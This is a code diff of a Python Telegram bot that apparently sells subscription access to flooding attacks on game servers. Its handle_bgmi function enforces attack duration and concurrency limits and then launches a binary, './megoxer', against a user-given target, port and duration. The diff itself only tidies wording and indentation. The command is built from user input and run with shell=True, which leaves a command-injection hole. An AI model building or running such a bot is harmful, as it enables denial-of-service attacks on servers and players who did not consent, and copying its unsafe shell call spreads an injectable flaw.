@@ -151,10 +151,10 @@ def handle_bgmi(message):
         bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
         return
 
-    # Check current active attacks and ensure maximum 4 concurrent attacks
+    # Check current active attacks and ensure maximum 1 concurrent attack
     current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
     if len(current_active) >= 1:
-        bot.reply_to(message, "🚨 Maximum of 1 concurrent attacks allowed. Please wait for some to finish before launching a new attack.")
+        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
         return
 
     # Log and record the attack
@@ -184,8 +184,8 @@ def handle_bgmi(message):
         parse_mode='Markdown'
     )
 
-   # Build the command to run your binary using default CPU settings
-   full_command = f"./megoxer {target} {port} {duration} 900"
+    # Build the command to run your binary using default CPU settings
+    full_command = f"./megoxer {target} {port} {duration} 900"
     try:
         subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception as e:
@@ -256,7 +256,7 @@ def help_command(message):
     - **/status** - Check your subscription status.
     - **/list_users** - List all users with access (Admin only).
     - **/backup** - Backup user access data (Admin only).
-    - **/download_backup** - Download users data (Admin Only).
+    - **/download_backup** - Download user data (Admin Only).
     
     📋 **Usage Notes:**
     - 🔄 Replace `<user_id>`, `<target>`, `<port>`, and `<duration>` with the appropriate values.
@@ -370,7 +370,7 @@ def backup_command(message):
             backup_file.write(f"{user_id},{expiration.isoformat()}\n")
     bot.reply_to(message, "✅ User access data has been backed up.")
     
-# command: /download_backup
+# Command: /download_backup
 @bot.message_handler(commands=['download_backup'])
 def download_backup(message):
     if str(message.from_user.id) not in ADMIN_ID:
